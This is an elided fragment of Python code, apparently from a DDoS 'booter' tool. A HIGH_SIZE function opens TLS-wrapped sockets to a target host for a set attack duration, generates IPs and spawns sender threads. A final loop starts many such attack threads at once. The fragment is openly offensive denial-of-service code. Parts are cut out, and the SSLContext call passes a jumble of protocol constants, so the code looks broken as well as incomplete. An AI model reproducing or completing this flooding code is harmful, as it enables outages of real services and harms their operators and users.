...
def HIGH_SIZE(target,methods,duration_sec_attack_dude):
    ...
    for _ in range(int(duration_sec_attack_dude)):
        try:
            ...
            a2 = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
            a2.options = ssl.OP_NO_RENEGOTIATION
            ips = gen_ips()
            fixed_byt = []
            ...
            threading.Thread(target=sender,args=(a2.wrap_socket(s,server_hostname=target['host']),fixed_byt)).start()
            path += 1
...
for _ in range(int(thread_lower)):
 for _ in range(10):threading.Thread(target=HIGH_SIZE,args=(target,METHODS,time_booter)).start()